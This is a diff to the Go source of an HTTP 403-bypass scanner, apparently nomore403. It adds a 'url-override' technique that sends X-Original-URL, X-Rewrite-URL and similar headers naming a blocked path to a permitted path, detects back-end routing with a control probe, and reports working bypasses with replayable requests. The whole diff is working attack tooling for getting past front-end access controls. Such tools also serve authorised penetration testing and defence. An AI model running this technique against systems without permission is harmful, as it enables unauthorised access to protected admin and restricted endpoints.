@@ -10,6 +10,7 @@ import (
 	"net/url"
 	"os"
 	"os/exec"
+	"path"
 	"sort"
 	"strconv"
 	"strings"
@@ -286,6 +287,28 @@ func statusPriority(status int) int {
 	default:
 		return 1
 	}
+}
+
+// responsesDiffer reports whether two responses are distinguishable from each
+// other. It is the oracle techniques use when they compare against a control
+// response they captured themselves, rather than against the global calibration
+// baseline.
+func responsesDiffer(a, b ResponseInfo) bool {
+	if a.statusCode != b.statusCode {
+		return true
+	}
+	if a.bodyHash != "" && b.bodyHash != "" && a.bodyHash != b.bodyHash {
+		return true
+	}
+	if a.location != b.location {
+		return true
+	}
+
+	tolerance := getCalibTolerance()
+	if tolerance <= 0 {
+		tolerance = calibrationTolerance
+	}
+	return absoluteDifference(a.contentLength, b.contentLength) > tolerance
 }
 
 func absoluteDifference(a, b int) int {
@@ -668,6 +691,8 @@ func techniqueFamily(technique string) string {
 		return "trust-header"
 	case "host-override":
 		return "host-header"
+	case "url-override":
+		return "url-override"
 	case "endpaths", "midpaths", "double-encoding", "unicode-encoding", "path-case-switching", "path-normalization", "payload-position":
 		return "path"
 	case "suffix-tricks":
@@ -750,11 +775,11 @@ func prioritizeTechniques(techniques []string, hints []string) []string {
 	for _, hint := range hints {
 		switch hint {
 		case "AWS ELB/ALB", "CloudFront", "Cloudflare", "Envoy", "Nginx":
-			for _, tech := range []string{"absolute-uri", "header-confusion", "forwarded-trust", "proto-confusion", "host-override", "raw-authority", "headers", "path-normalization", "suffix-tricks", "http-parser"} {
+			for _, tech := range []string{"absolute-uri", "header-confusion", "url-override", "forwarded-trust", "proto-confusion", "host-override", "raw-authority", "headers", "path-normalization", "suffix-tricks", "http-parser"} {
 				priority[tech] += 10
 			}
 		case "IIS":
-			for _, tech := range []string{"unicode", "double-encoding", "path-normalization", "raw-authority", "suffix-tricks"} {
+			for _, tech := range []string{"url-override", "unicode", "double-encoding", "path-normalization", "raw-authority", "suffix-tricks"} {
 				priority[tech] += 10
 			}
 		}
@@ -822,6 +847,7 @@ var techniqueLabels = map[string]string{
 	"path-normalization":     "Path normalization",
 	"suffix-tricks":          "Suffix tricks",
 	"header-confusion":       "Header confusion",
+	"url-override":           "URL override",
 	"host-override":          "Host override",
 	"forwarded-trust":        "Forwarded trust",
 	"proto-confusion":        "Proto confusion",
@@ -855,6 +881,7 @@ var techniqueAliases = map[string]string{
 	"path-normalization":     "normalize",
 	"suffix-tricks":          "suffix",
 	"header-confusion":       "hdr-conf",
+	"url-override":           "url-ovr",
 	"host-override":          "host",
 	"forwarded-trust":        "forwarded",
 	"proto-confusion":        "proto",
@@ -3248,6 +3275,241 @@ func requestHeaderConfusion(options RequestOptions) {
 	runHeaderPayloads(options, "header-confusion", payloads)
 }
 
+// urlOverrideHeaders are headers that some back-ends treat as the authoritative
+// request path, overriding the path on the request line. They exist so a
+// reverse proxy can rewrite a URL without changing the request line
+// (IIS/ARR's X-Original-URL, Symfony's X-Rewrite-URL, nginx auth_request's
+// X-Original-URI, and so on).
+//
+// When the front-end enforces access control on the request line but the
+// back-end routes on one of these headers, an attacker can request a path the
+// front-end permits while the back-end serves the path it was told to.
+var urlOverrideHeaders = []string{
+	"X-Original-URL",
+	"X-Rewrite-URL",
+	"X-Override-URL",
+	"X-Original-Uri",
+	"X-Forwarded-Uri",
+	"X-HTTP-DestinationURL",
+}
+
+// urlOverrideCandidate is one (base path, header) pair the back-end was proven
+// to route on, together with the control response that proved it.
+type urlOverrideCandidate struct {
+	baseURI  string
+	basePath string
+	name     string
+	control  ResponseInfo
+}
+
+// urlOverrideBase is a path the front-end lets through, and its unmodified
+// response.
+type urlOverrideBase struct {
+	uri   string
+	path  string
+	plain ResponseInfo
+}
+
+// requestURLOverride tests whether the front-end and the back-end disagree
+// about which path a request is for.
+//
+// Unlike header-confusion, which sends rewrite headers to the blocked path
+// itself, this technique sends them to a path the front-end *permits*: the
+// request line stays allowed, and the header carries the blocked path to the
+// back-end. That is the shape of the classic X-Original-URL bypass, where
+// GET / with "X-Original-URL: /admin" reaches an /admin that GET /admin cannot.
+//
+// It runs a two-step oracle per header so a permitted base path cannot be
+// mistaken for a bypass:
+//
+//  1. Point the header at a path that cannot exist. If the response is
+//     indistinguishable from the plain base request, the back-end is ignoring
+//     the header entirely and nothing here is a finding.
+//  2. Point the header at the blocked path. If that resolves differently from
+//     the nonexistent path, the back-end routed somewhere real.
+//
+// Scoring compares against the step-1 control rather than the global
+// calibration baseline: the calibration was measured on the blocked path, and
+// these requests are aimed somewhere else entirely.
+func requestURLOverride(options RequestOptions) {
+	parsedURL, err := url.Parse(options.uri)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
+	targetValue := urlOverrideTargetValue(parsedURL)
+	if targetValue == "" {
+		// The blocked path is the site root; there is nothing to reach past it.
+		return
+	}
+
+	bases := urlOverrideBases(options, parsedURL)
+	if len(bases) == 0 {
+		return
+	}
+
+	candidates := urlOverrideCandidates(options, bases)
+	if len(candidates) == 0 {
+		return
+	}
+
+	// Every control here is a response to a nonexistent path, so they agree in
+	// practice; take the first for a deterministic, race-free baseline.
+	setTechniqueBaseline("url-override", candidates[0].control)
+
+	w := goccm.New(maxGoroutines)
+	p := newProgress("url-override", len(candidates))
+
+	for _, candidate := range candidates {
+		time.Sleep(time.Duration(delay) * time.Millisecond)
+		w.Wait()
+		go func(candidate urlOverrideCandidate) {
+			defer w.Done()
+			defer p.done()
+
+			headers := append(cloneHeaders(options.headers), header{candidate.name, targetValue})
+			resp, err := requestWithRetry(options.method, candidate.baseURI, headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
+			if err != nil {
+				if !errors.Is(err, ErrRateLimited) {
+					logVerbose(err)
+				}
+				return
+			}
+
+			// The override only reached something new if the blocked path
+			// resolved differently from the nonexistent one.
+			if !responsesDiffer(resp, candidate.control) {
+				return
+			}
+
+			label := candidate.name + ": " + targetValue + " via " + candidate.basePath
+			result := resultFromResponse(label, false, "url-override", resp)
+			attachHTTPReplay(&result, options.method, candidate.baseURI, headers, "", options.redirect, options.proxy, options.timeout)
+			printResponse(result, "url-override")
+		}(candidate)
+	}
+	w.WaitAllDone()
+	p.finish()
+}
+
+// urlOverrideTargetValue is the value the override headers should carry: the
+// blocked path, with its query string when it has one. Returns "" when the
+// target is the site root and an override would be meaningless.
+func urlOverrideTargetValue(parsedURL *url.URL) string {
+	path := parsedURL.EscapedPath()
+	if path == "" || path == "/" {
+		return ""
+	}
+	if parsedURL.RawQuery != "" {
+		return path + "?" + parsedURL.RawQuery
+	}
+	return path
+}
+
+// urlOverrideBases probes the paths an override could be smuggled through --
+// the site root and the blocked path's parent -- and keeps the ones the
+// front-end actually serves. A base the front-end also denies cannot carry a
+// header to the back-end.
+func urlOverrideBases(options RequestOptions, parsedURL *url.URL) []urlOverrideBase {
+	var bases []urlOverrideBase
+	for _, path := range urlOverrideBasePaths(parsedURL) {
+		baseURI := parsedURL.Scheme + "://" + parsedURL.Host + path
+		resp, err := requestWithRetry(options.method, baseURI, options.headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
+		if err != nil {
+			if !errors.Is(err, ErrRateLimited) {
+				logVerbose(err)
+			}
+			continue
+		}
+		if resp.statusCode == 401 || resp.statusCode == 403 || resp.statusCode >= 500 {
+			continue
+		}
+		bases = append(bases, urlOverrideBase{uri: baseURI, path: path, plain: resp})
+	}
+	return bases
+}
+
+// urlOverrideBasePaths lists the candidate request-line paths, most permissive
+// first: the site root, then the blocked path's immediate parent when that is
+// something else.
+func urlOverrideBasePaths(parsedURL *url.URL) []string {
+	paths := []string{"/"}
+
+	parent := path.Dir(strings.TrimSuffix(parsedURL.EscapedPath(), "/"))
+	if !strings.HasSuffix(parent, "/") {
+		parent += "/"
+	}
+	if parent != "/" && parent != "./" {
+		paths = append(paths, parent)
+	}
+	return paths
+}
+
+// urlOverrideCandidates runs step 1 of the oracle for every (base, header)
+// pair and returns the pairs the back-end demonstrably routes on.
+func urlOverrideCandidates(options RequestOptions, bases []urlOverrideBase) []urlOverrideCandidate {
+	var (
+		mu         sync.Mutex
+		candidates []urlOverrideCandidate
+	)
+
+	w := goccm.New(maxGoroutines)
+	p := newProgress("url-override-probe", len(bases)*len(urlOverrideHeaders))
+
+	for _, base := range bases {
+		for _, name := range urlOverrideHeaders {
+			time.Sleep(time.Duration(delay) * time.Millisecond)
+			w.Wait()
+			go func(base urlOverrideBase, name string) {
+				defer w.Done()
+				defer p.done()
+
+				headers := append(cloneHeaders(options.headers), header{name, nonexistentPath()})
+				control, err := requestWithRetry(options.method, base.uri, headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
+				if err != nil {
+					if !errors.Is(err, ErrRateLimited) {
+						logVerbose(err)
+					}
+					return
+				}
+				// Indistinguishable from the plain request means the header was
+				// ignored, so it cannot carry a path anywhere.
+				if !responsesDiffer(control, base.plain) {
+					return
+				}
+
+				mu.Lock()
+				candidates = append(candidates, urlOverrideCandidate{
+					baseURI:  base.uri,
+					basePath: base.path,
+					name:     name,
+					control:  control,
+				})
+				mu.Unlock()
+			}(base, name)
+		}
+	}
+	w.WaitAllDone()
+	p.finish()
+
+	// Goroutine completion order is arbitrary; sort so the chosen baseline and
+	// the reported order are stable between runs.
+	sort.SliceStable(candidates, func(i, j int) bool {
+		if candidates[i].basePath != candidates[j].basePath {
+			return candidates[i].basePath < candidates[j].basePath
+		}
+		return candidates[i].name < candidates[j].name
+	})
+	return candidates
+}
+
+// nonexistentPath builds a path that no application should serve, used as the
+// control probe for header-driven routing.
+func nonexistentPath() string {
+	return fmt.Sprintf("/nomore403-%08x", rand.Uint32()) //nolint:gosec // control probe, not a security decision
+}
+
 func requestHostOverride(options RequestOptions) {
 	parsedURL, err := url.Parse(options.uri)
 	if err != nil {
@@ -3908,6 +4170,9 @@ func executeTechniques(options RequestOptions) {
 		case "header-confusion":
 			requestHeaderConfusion(options)
 			printSuppressedSummary("header-confusion")
+		case "url-override":
+			requestURLOverride(options)
+			printSuppressedSummary("url-override")
 		case "host-override":
 			requestHostOverride(options)
 			printSuppressedSummary("host-override")
@@ -3931,7 +4196,7 @@ func executeTechniques(options RequestOptions) {
 			printSuppressedSummary("raw-desync")
 		default:
 			fmt.Printf("Unrecognized technique. %s\n", tech)
-			fmt.Print("Available techniques: verbs, verbs-case, headers, endpaths, midpaths, double-encoding, unicode, http-versions, http-parser, path-case, hop-by-hop, absolute-uri, method-override, path-normalization, suffix-tricks, header-confusion, host-override, forwarded-trust, proto-confusion, ip-encoding, raw-duplicates, raw-authority, raw-desync\n")
+			fmt.Print("Available techniques: verbs, verbs-case, headers, endpaths, midpaths, double-encoding, unicode, http-versions, http-parser, path-case, hop-by-hop, absolute-uri, method-override, path-normalization, suffix-tricks, header-confusion, url-override, host-override, forwarded-trust, proto-confusion, ip-encoding, raw-duplicates, raw-authority, raw-desync\n")
 		}
 	}
 }
